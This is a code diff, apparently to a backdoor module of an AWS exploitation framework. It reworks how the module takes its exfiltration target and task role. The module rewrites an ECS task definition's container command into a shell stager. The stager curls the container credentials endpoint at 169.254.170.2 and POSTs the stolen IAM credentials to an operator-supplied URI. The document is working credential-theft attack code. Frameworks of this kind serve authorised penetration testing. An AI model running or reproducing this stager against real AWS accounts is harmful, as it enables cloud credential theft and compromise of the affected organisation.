@@ -39,8 +39,7 @@ module_info = {
     # Module arguments to autocomplete when the user hits tab.
     'arguments_to_autocomplete': ['--task-definition',
 								  '--cluster',
-								  '--lhost',
-								  '--lport',
+								  '--uri',
 								  '--execution-role',
 								  '--subnet',
 								  '--security-group']
@@ -60,14 +59,22 @@ parser = argparse.ArgumentParser(add_help=False, description=module_info['descri
 # Make sure to add all arguments to module_info['arguments_to_autocomplete']
 parser.add_argument('--task-definition', required=False, default=None, help='A task definition ARN')
 parser.add_argument('--cluster', required=False, default=None, help='Cluster ARN to host task')
-parser.add_argument('--lhost', required=False, default=None, help='IP/domain to catch credentials via POST')
-parser.add_argument('--lport', required=False, default=80, help='Port to catch creds, defaults to 80')
+parser.add_argument('--uri', required=False, default=None, help='URI to send credentials to via POST')
 parser.add_argument('--task-role', required=False, default=None,
                     help='ARN of task role, defaults to what is provided in the task definition')
 parser.add_argument('--subnet', required=False, default=None,
                     help='Subnet ID to host task. Subnet and security group must be in same VPC')
 parser.add_argument('--security-group', required=False, default=None,
                     help='Security group Id to host task. Subnet and security group must be in same VPC')
+
+def ask_for_task_role(default=None):
+    task_role = input(f"Enter a task role to target ({str(default)})")
+
+    if not task_role and not default:
+        print("An explicit task role is required.")
+        return ask_for_task_role()
+
+    return task_role
 
 
 # Main is the first function that is called when this module is executed.
@@ -88,7 +95,7 @@ def main(args, pacu_main):
         if fetch_data(['ECS', 'TaskDefinitions'], module_info['prerequisite_modules'][0], '--taskdef') is False:
             print("    Pre req module not ran successfully. Exiting...")
             return None
-        task_definitions = session.ECS['TaskDefinitions']
+        task_definitions = session.ECS.get('TaskDefinitions', [])
         for i in range(0, len(task_definitions)):
             print("    [{}]:{}".format(i, task_definitions[i]))
         task_def_input = int(input('    Enter the task definition ARN you are targeting: '))
@@ -115,20 +122,16 @@ def main(args, pacu_main):
             taskDefinition=task_definition
         )
 
-        lport = args.lport
-
-        if not args.lhost:
-            lhost = input("    Enter an IP / Domain to host payload/receive credentials: ")
-            tmp = lhost.split(':')
-            if len(tmp) == 2:
-                lhost = tmp[0]
-                lport = tmp[1]
+        if args.uri:
+            uri = args.uri
         else:
-            lhost = args.lhost
+            uri = input("    Enter a URI to host payload/receive credentials: ")
 
 
-        stager = ['/bin/sh -c \"curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST '
-                  '-d @data.json http://{}:{}\"'.format(lhost, lport)]
+        stager = [
+            '/bin/sh -c "curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json && curl -X POST '
+            '-d @data.json {}"'.format(uri)
+        ]
         task_def_keys = [x for x in task_def['taskDefinition'].keys()]
         temp = task_def['taskDefinition']
         cont_def = temp['containerDefinitions'][0]
@@ -137,13 +140,7 @@ def main(args, pacu_main):
         cont_def['command'] = stager
         container_defs = [cont_def]
 
-        if not args.task_role:
-            task_role = input(
-                "Enter a task role to target. Leave blank to target the task role associated with the task definition "
-                "provided: ")
-            
-        if not task_role:
-            task_role = temp['taskRoleArn']
+        task_role = ask_for_task_role(temp.get('taskRoleArn'))
 
         if not os.path.exists('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name)):
             os.makedirs('sessions/{}/downloads/ecs__backdoor_task_def/'.format(session.name))
